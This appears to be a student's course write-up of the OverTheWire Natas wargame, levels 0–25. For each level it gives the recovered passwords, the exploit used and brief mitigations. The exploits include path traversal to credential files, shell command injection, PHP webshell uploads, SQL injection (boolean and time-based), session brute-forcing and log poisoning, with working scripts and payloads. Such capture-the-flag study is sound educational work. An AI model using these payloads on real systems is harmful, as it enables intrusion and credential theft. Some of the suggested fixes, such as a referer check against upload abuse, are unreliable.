# OverTheWire Natas Project Part #1

## Student Information

* Student name: Tom Hills  
* NetId: jhills


## Project Description

In this project, you will be complete the Natas challenges at <https://overthewire.org/wargames/natas/>. You will complete challenges Natas 0–Natas 25. For each challenge, you will complete the following worksheet describing:
1. The credentials found in the challenge.
2. How you solved the challenge. Include any JavaScript or other scripts necessary to retrieve the credentials.
3. What mitigations should be used to address the exploit.

In the workshop, the challenges are named based on the username used to login to the shell for that challenge. For example, the challenge labeled "Natas 10" will be logged into with the username natas10, and the solution will be the credentials for the user Natas11.

You can find a basic guide for markdown formatting [here](https://www.markdownguide.org/basic-syntax/). In particular, note the [code section](https://www.markdownguide.org/basic-syntax/#code) which should be used to annotate any code or commands used in your writeup.

**Do not wait to start this lab until the last second.** Do a little each week. I recommend that in the first week, you complete Natas 0–13. These early challenges are much easier than the later challenges.


## Hints
* Natas 11: `plaintext ^ key` gives the ciphertext. What does `plaintext ^ ciphertext` equal?
* Natas 15–16: Often bruteforcing all possible passwords will take too long. Is there a way to incrementally guess prefixes of the password?
* Natas 17: Are there any side channels we could use?
* Natas 25: The main page will not contain the password file. Is there another page that you can trick into including the password file? Note, this challenge requires chaining two different attacks.


## Challenges

---
### Natas 00

#### Credentials
username: natas1
password: gtVrDuiDfck831PqWsLEZy5gyDz1clto

#### How you passed the challenge
Using chrome's devTools for the browser, I found the password written in a comment in the html of "Elements" tab. 

#### What sins are evidenced in this challenge
Writing password for another user in the public viewable html code of the webpage.

#### How could those sins be mitigated
Don't write password of another user in the public viewable html code of the webpage.



---
### Natas 01

#### Credentials
username: natas2
password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

#### How you passed the challenge
Using chrome's devTools for the browser, I found the password written in a comment in the html of "Elements" tab. 

#### What sins are evidenced in this challenge
Writing password for another user in the public viewable html code of the webpage.

#### How could those sins be mitigated
Don't write password of another user in the public viewable html code of the webpage.



---
### Natas 02

#### Credentials
username: natas3
password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

#### How you passed the challenge
Using chrome's devTools for the browser, I noticed an image being stored in *http://natas2.natas.labs.overthewire.org/files/*. Upon going there in my browser, I noticed *users.txt* file in the same diretory as the image file. When viewing it, I saw that natas3 password was there in plaintext. 

#### What sins are evidenced in this challenge
Storing password for natas3 in plaintext within an unprotected file. 

#### How could those sins be mitigated
Don't store passwords in plaintext within an unprotected files. 



---
### Natas 03

#### Credentials
username: natas4
password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

#### How you passed the challenge
Using chrome's devTools for the browser, I initially had no idea what to do with the hint given. After some research, I learned that most websites have a *robots.txt* file which is used to give instructions to search bots about what to include and what not to include in their results. As such, I looked at *http://natas3.natas.labs.overthewire.org/robots.txt* and found that "/s3cr3t/" directory was disallowed. After going to *http://natas3.natas.labs.overthewire.org/s3cr3t/*, I saw a "users.txt" file which contained the password for natas4.

#### What sins are evidenced in this challenge
Having plaintext password stored in a publicly accessible file, though there was some attempt to hide it. 

#### How could those sins be mitigated
Don't store plaintext passwords in publicly accessible files even if there is some attempt to conceal them. 


---
### Natas 04

#### Credentials
username: natas5
password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

#### How you passed the challenge
After researching how websites check last visited web address, I found information on *referer*. Turns out, you can manually set the *referer* using python and *requests* package. So, I ran the following python script:
```
    import requests # ignore the error. Requests module is installed on school computers. 

    website = "http://natas4.natas.labs.overthewire.org/"

    sess = requests.Session()
    sess.auth = ('natas4', 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ')
    sess.headers.update({'referer': "http://natas5.natas.labs.overthewire.org/"})
    req = sess.get(website)

    print(req.text)
```
which had the password for natas5 in the responses text.

#### What sins are evidenced in this challenge
Using referer as a security measure for protecting other user's password.

#### How could those sins be mitigated
Don't use referer as a security measure for protecting other user's passwords b/c it can be manually set. 


---
### Natas 05

#### Credentials
username: natas6
password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

#### How you passed the challenge
Using the following script, I was able to see the headers of the request response: 
```
    import requests # ignore the error. Requests module is installed on school computers. 

    website = "http://natas5.natas.labs.overthewire.org/"

    sess = requests.Session()

    sess.auth = ('natas5', 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq')
    # sess.headers.update({'Set-Cookie': "loggedin=1"})
    resp = sess.get(website)
    resp.headers.update({'Set-Cookie': "loggedin=1"})

    print(resp.text)
    print(resp.headers)
```
The only one that looked like it had any relevance was *'Set-Cookie': 'loggedin=0'*. By changing this to *'Set-Cookie': 'loggedin=1'*, I hoped to get through the level. You can see from the above script, that I tried to change it with the script both before the request and after as seen above, but nothing worked. It wasn't until I used the console of the dev tools to change the value (i.e., document.cookie = "loggedin=1") and then refresh the page that I ended up getting the password. 

#### What sins are evidenced in this challenge
Even though it was tricky, the password could still be retrieved by modifying publicly available parameters and refreshing the webpage. 

#### How could those sins be mitigated
More layers of security and authentication would have solved this. 


---
### Natas 06

#### Credentials
username: natas7
password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

#### How you passed the challenge
After loading the page, I clicked on "View source" link and reviewed the php code. It was obvious from reviewing the code that if I inputted the correct "secret", then I would be given natas7's password. And the only place I could think of to look was in the "includes/secret.inc" path of the website. Once I visited *http://natas6.natas.labs.overthewire.org/includes/secret.inc*, I was shown the correct secret which when inputted into the site's input field, displayed natas7's password. 

#### What sins are evidenced in this challenge
First, having natas7's password available when logged in as natas6 in any way, unless intended. Second, *http://natas6.natas.labs.overthewire.org/includes/secret.inc* was publicly accessible even though *http://natas6.natas.labs.overthewire.org/includes* was not 

#### How could those sins be mitigated
Don't have any other user's password or sensitive information available to any other user. And don't have a so called "secret" publicly accessible!


---
### Natas 07

#### Credentials
username: natas8
password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

#### How you passed the challenge
The hint given says that the password for natas8 is in `/etc/natas_webpass/natas8`. My first attempt was to try `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`, but this didn't work. I then realized that I need to move up the directory hierachy to reach *etc* folder. I kept adding `../` items to the path until finally this worked: `http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../../../../etc/natas_webpass/natas8` and the password was displayed on the page.

#### What sins are evidenced in this challenge
Having `/etc/natas_webpass/natas8` file accessible/readable by user natas7.

#### How could those sins be mitigated
Correct permissions of files containing sensitive information. 


---
### Natas 08

#### Credentials
username: natas9
password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

#### How you passed the challenge
After reviewing source code, it was easy to see the user provided secret was being encoded by base64 and compared to given encodedSecret value. So, it was just a matter of decoding the encodedSecret in order to input the correct secret in the form. This was accomplished using the following python script:
```
    import base64

    hexSecret = "3d3d516343746d4d6d6c315669563362"
    byteSecret = bytes.fromhex(hexSecret)
    byteSecret = byteSecret[::-1]
    byteSecret = base64.decodebytes(byteSecret)

    print(byteSecret)
```

#### What sins are evidenced in this challenge
Having sensitive information (i.e., encodedSecret) publicly viewable in the html source code as well as showing the encoding method. 

#### How could those sins be mitigated
Don't leave sensitive information in publicly viewable source code. 


---
### Natas 09

#### Credentials
username: natas10
password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

#### How you passed the challenge
After reviewing the source code, it became apparent that "passthru" would run system console commands. As such, it was trivial to form the input to get the password. At first I tried `; cat ../../../../../../../../../../etc/natas_webpass/natas9;` which worked, but then I shortened it to `; cat /etc/natas_webpass/natas10;` which did essentially the same thing. 

#### What sins are evidenced in this challenge
Running system console commands using user input without any sanitation or filtering efforts.

#### How could those sins be mitigated
Don't include user input in system console commands when possible. If you must do it, filter/sanitize the input before execution. 


---
### Natas 10

#### Credentials
username: natas11
password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

#### How you passed the challenge
Since the source code was the same as Natas 9 except with filtering, I had to get creative. I'm new to linux console commands, but found that grep accepts multiple file arguments after the PATTERN argument. Since I knew that the password would contain ascii letters, I chose `[A-Za-z] /etc/natas_webpass/natas11` as my input which printed Natas11's password. 

#### What sins are evidenced in this challenge
Running system console commands using user input without thorough sanitation or filtering plus not having proper permissions on files and running applications.

#### How could those sins be mitigated
Don't include user input in system console commands when possible. If you must do it, be extremely thorough in your defense layers (filtering/sanitizing, file permissions, etc). 


---
### Natas 11

#### Credentials
username: natas12
password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

#### How you passed the challenge
Unfortunately, the python code used to solve this lab is a bit long to be pasting here, so I'll just describe. After reviewing the source code, I noticed there was a `showpassword` and `bgcolor` elements in the default data. `showpassword` was defaulted to "no", so it seemed obvious that my mission was to change that to "yes". Since the default data was encrypted with XOR, this meant the secret key could be discovered using `ciphertext XOR plaintext = secret key` and I knew both the ciphertext and plaintext. After writing a script to do this, I discovered the secret key which luckily was a repeating 'qw8J' pattern. Now, it was then easy enough to change the default plaintext with `showpassword` == "yes" and then use secret key to encrypt it. Once the new encrypted data was known, I simply edited the cookie as such, `document.cookie="data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"`, which when refreshed gave me natas12 password. 

#### What sins are evidenced in this challenge
Naming cookie data in such a way as to broadcast where changes needed to be made in order to obtain other user's password. Also, there probably shouldn't be an option to show another user's password when logged in as someone else.

#### How could those sins be mitigated
Don't make other user's password accessible through scripting when logged in as another user. 



---
### Natas 12

#### Credentials
username: natas13
password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

#### How you passed the challenge
After reviewing the source code and realizing all uploaded files were given random names and made to be .jpg files. Looking closer, I realized that the site would run php code if I could get the correct extension. I made a php file with the following code:
```
    <?php
    echo system("cat /etc/natas_webpass/natas13");
    ?>
```
I then downloaded the html file for `natas12.natas.labs.overthewire.org` website. I opened this local html and changed `<input type="hidden" name="filename" value="cx3fs5ik4y.jpg">` element to `<input type="hidden" name="filename" value="cx3fs5ik4y.php">` and then uploaded my php file. This kept the php extension and when I clicked on it, it executed giving me the password for Natas13.

#### What sins are evidenced in this challenge
Giving the input element in the original html a default value of `cx3fs5ik4y.jpg` which bypasssed the protection of having it change to .jpg file. 

#### How could those sins be mitigated
My approach would have been mitigated with a referer header check. 



---
### Natas 13

#### Credentials
username: natas14
password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

#### How you passed the challenge
I used the same technique as in Natas 12, but noticed I got the "File is not an image" error. Upon further investigation, I found that image files have "magic numbers" in the first few bytes of the file to indicate what image file type they are. With that in mind, I modified my php file to use the magic number for bitmap image files as follows: 
```
    BMP<?php
    echo system("cat /etc/natas_webpass/natas13");
    ?>
```
I then continued as before by clicking on uploaded php file which ran the code revealing the password.

#### What sins are evidenced in this challenge
Same as Natas12, except the image check was easily bypassed using magic number for image files. 

#### How could those sins be mitigated
My approach would have been mitigated with a referer header check. 


---
### Natas 14

#### Credentials
username: natas15
password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

#### How you passed the challenge
Afer reviewing the source code, it was obvious a SQL injection attack was needed. After playing around with a few options, I finally got the password using `http://natas14.natas.labs.overthewire.org/index.php?username=user&password=pass" OR "1"="1&debug` GET request link.

#### What sins are evidenced in this challenge
Not santizing/filtering sql queries.

#### How could those sins be mitigated
Santizing/filter sql queries.


---
### Natas 15

#### Credentials
username: natas16
password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

#### How you passed the challenge
This one took a while to figure out since the only outputs where "user exists" or not. Finally, after verifying that "natas16" was in the database, I realized that I could use these "true/false" paths to brute force guess the password since I knew the length (32 characters) and alphabet of the password was comprised only of upper/lower letters and 0-9 digits. After writing a script (too long to paste here), I let it run building the password one character at a time until finally I had the whole thing.

#### What sins are evidenced in this challenge
Not santizing/filtering sql queries.

#### How could those sins be mitigated
Santizing/filter sql queries.



---
### Natas 16

#### Credentials
username: natas17
password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

#### How you passed the challenge
After studying the filtered characters in the php code, I realized that '$','(', and ')' were not filtered! This means I could write python script which loops through all known password characters ([A-Za-z0-9]) appending one at a time and grep each newly extended password as such 
`f"$(grep -E ^{password + char}.* /etc/natas_webpass/natas17)"` in as the params in python get request. If `$(grep -E ^{password + char}.* /etc/natas_webpass/natas17)` returned empty string b/c there was no substring match, then `$key` from `passthru("grep -i \"$key\" dictionary.txt");` in the php code would be empty, thus returning all items in dictionary.txt. However, if there was a substring match from `$(grep -E ^{password + char}.* /etc/natas_webpass/natas17)`, then the full 32 character password would be returned which would make `passthru("grep -i \"$key\" dictionary.txt");` return empty. All that is needed is to append successful characters (`char`) onto the `password` from `$(grep -E ^{password + char}.* /etc/natas_webpass/natas17)` until all 32 characters are revealed. 


#### What sins are evidenced in this challenge
Allowing user input to be used in system console commands and having missing characters in ```preg_match('/[;|&`\'"]/',$key)``` list.

#### How could those sins be mitigated
Don't allow user input into system console commands, and if you must, being extremely thorough in filtering user input, such as using a whitelist, etc. 



---
### Natas 17

#### Credentials
username: natas18
password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

#### How you passed the challenge
This was just like Natas 15, except this time there was no output. It took me quite a while to find a way to give me the same yes/no type of response needed in Natas 15. After some research, I determined that using the same SQL request as in Natas 15 with appending `" AND SLEEP(2)` to the end and timing out the request after 1 second would give me the yes or no I was looking for. If the correct character was guessed in the password, then the `" AND SLEEP(2)` would trigger causing a timeout. Then, I just triggered writing the `password + character` to stdout when a timeout was detected and slowly built up the password like I did in Natas 15. 

#### What sins are evidenced in this challenge
Not santizing/filtering sql queries.

#### How could those sins be mitigated
Santizing/filter sql queries.



---
### Natas 18

#### Credentials
username: natas19
password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

#### How you passed the challenge
After reviewing the PHP source code, I figured out all that was needed was to know the PHPSESSID for admin. And fortunately, the `maxid` was on 640 which was trivial to bruteforce. I wrote a python script which logged in as Natas 18, but set the PHPSESSID to different values between 0 and 640 until one of them registered as the admin session. Once the correct PHPSESSID was found, the password was revealed.  

#### What sins are evidenced in this challenge
Having admin strictly determined by session id only, especially since the range of ids was so small as to be trivally guessed through brute force.  

#### How could those sins be mitigated
Don't have admin status determined strictly through session id cookies. And if you must, do NOT have such a tiny range of possible id values. 



---
### Natas 19

#### Credentials
username: natas20
password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

#### How you passed the challenge
My first step was to look at the value of PHPSESSID (F12 -> "application" tab -> storage/Cookies) which I found to be `3130362d6e617461733139` whichy, after careful consideration, was ascii and decoded into `106-natas19`. This made it pretty obvious that an admin cookie would take the form `#-admin` where `#` would be a value between 0 and 640 as the source code was the same from the previous level. This made it easy to modify my Natas 18 code to adjust to the new cookie format. When I ran it, I got the password quickly. 

#### What sins are evidenced in this challenge
Having admin strictly determined by session id only, especially since the range of ids was so small as to be trivally guessed through brute force.  

#### How could those sins be mitigated
Don't have admin status determined strictly through session id cookies. And if you must, do NOT have such a tiny range of possible id values. 



---
### Natas 20

#### Credentials
username: natas21
password: IFekPyrQXftziDEsUr3x21sYuahypdgJ

#### How you passed the challenge
From the source code, we can see the line `if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)` which, when compared with the function *mywrite()*, tells me that the value of 1 is associated with the key of admin. But more importantly, the *mywrite()* delimits each written line with the newline character. This allowed me to enter `http://natas20.natas.labs.overthewire.org/index.php?debug=true&name=admin%0Aadmin%201` URL to get the key:value pair of admin:1 written. I then blanked out the input field on the refreshed page and hit "change name" button which revealed the password. 

#### What sins are evidenced in this challenge
Not filtering/sanitizing user input before processing.

#### How could those sins be mitigated
Filter/sanitize user input before processing.


---
### Natas 21

#### Credentials
username: natas22
password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ

#### How you passed the challenge
The source code for the first website showed the same line `if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)` from the previous challenge, but there was no code to exploit that I could see. I clicked on the link of the "colocated" website and studied the source code of this 2nd website. I noticed that there was a way to inject the key:value pair of admin:1 in the session cookie from the following piece of code:
```
    if(array_key_exists("submit", $_REQUEST)) { 
        foreach($_REQUEST as $key => $val) { 
        $_SESSION[$key] = $val; 
        } 
    }
```

As such, I entered `http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug&submit&admin=1` which confirmed for me that admin:1 was indeed in the session array. I then clicked on the link of the 2nd website back to the first, and when the first one loaded I was given the password for Natas 22.

#### What sins are evidenced in this challenge
Having admin status determined solely by key/value pair in session cookie and also having code which blatantly allowed injecting any key:value pair into the session.

#### How could those sins be mitigated
Having stricter/more secure architecture for determining admin status. 



---
### Natas 22

#### Credentials
username: natas23
password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE

#### How you passed the challenge
When first reviewing the source code, I was relieved b/c it looked so easy. I started by entering `http://natas22.natas.labs.overthewire.org/index.php?revelio=1` url and expecting the password to show. However, I was greeted with a blank page. Puzzled, I looked at the source code and again and realized there was a check to see if revelio already existed, and it redirected the site if it did. To get around this, I wrote the following python script:
```
    import requests

    sess = requests.Session()
    sess.auth = ("natas22", "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ")

    res = sess.post(allow_redirects=False, url="http://natas22.natas.labs.overthewire.org/index.php?revelio")
    for line in res.text.splitlines():
        if "Password" in line:
            print(line)

    sess.close()
```

which quickly revealed the password.

#### What sins are evidenced in this challenge
Having such a poor check for establishing admin rights. 

#### How could those sins be mitigated
Having stricter/more secure architecture for determining admin status. 



---
### Natas 23

#### Credentials
username: natas24
password: OsRmXFguozKpTZZ5X14zNO43379LZveg

#### How you passed the challenge
Luckily, the source code was really easy. The only odd part was the check for a password greater than 10 characters. I looked up strstr() and found out it returns the first instance of substring, meaning I could have a password greater than 10. So I entered `http://natas23.natas.labs.overthewire.org/index.php?passwd=111iloveyou` URL and was given the password for Natas 24.

#### What sins are evidenced in this challenge
Having a very insecure check for the password, especially since the "developer" seemed to misunderstand the use of strstr(). Also, the password was written in the code in plaintext.

#### How could those sins be mitigated
Use salt/hash for user entered password for doing checks and completely abandon what was done here. 


---
### Natas 24

#### Credentials
username: natas25
password: GHF6X7YwACaYYssHVY05cFq83hRktl4c

#### How you passed the challenge
This one stumped me at first as I didn't see glaring exploit in the very simple source code. Luckily, the source code was so simple I decided the problem must be with strcmp() somehow. After lots of googling about the possible inputs and return values, I discovered that if you give strcmp() an array as one of it's arguments, it'll return 0!! So I simply entered `http://natas24.natas.labs.overthewire.org/index.php?passwd[]` URL and was immediately given the password for Natas 25.

#### What sins are evidenced in this challenge
Using a library function for comparing input and password without fully understanding it's functionality and return values. 

#### How could those sins be mitigated
Either screen input to accomodate strcmp()'s shortcomings, or find another compare function that is fully understood and utilize it properly.


---
### Natas 25

#### Credentials
username: natas26
password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T

#### How you passed the challenge
This one was really tough, though I knew right away this was some kind of file injection attack. There was an effort to sanitize the file name which I initially thought was faily full proof. However, after some consideration, I realized that the first check for "../" substring involved only a single search and replace operation. This meant that I could still inject "../" substring if I used something like "....//" which would remove the middle "../" portion leaving "../" still in the file name!!! For the second filter which exited if substring "natas_webpass" was found, I was really stumped. Then I realized from remembering the lecture in class that if I could get php code into the log file, the server would likely run it! But again, how! Finally, I realized that I had control of the User-Agent header which would bypass the 2nd filter!!! With all this known, I wrote the following python script:
```
    import requests

    sess = requests.Session()
    sess.auth = ("natas25", "GHF6X7YwACaYYssHVY05cFq83hRktl4c")

    # do a GET request simply to get PHPSESSID for the follwing POST request.
    res = sess.get(url="http://natas25.natas.labs.overthewire.org/")

    res = sess.post(url=f"http://natas25.natas.labs.overthewire.org/index.php?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_{res.cookies['PHPSESSID']}.log", headers={"User-Agent" : "<?php include '/etc/natas_webpass/natas26'; ?>"})

    print(res.text)

    sess.close()
```
which when ran, outputted the password in the log output from the response text!!

#### What sins are evidenced in this challenge
Even though filtration/sanitization efforts were made, the first check was not thorough enough b/c developers are not as clever as they think they are. This allowed injecting php code into the log file which allowed access to the password file which contained the password in plaintext. Another "no-no".

#### How could those sins be mitigated
It would have been better to simply exit the program for all checks. Also, storing the password in plaintext is never a good idea despite setting permissions. It would have been to salt and hash the user inputted password and store that result instead of the password itself. 


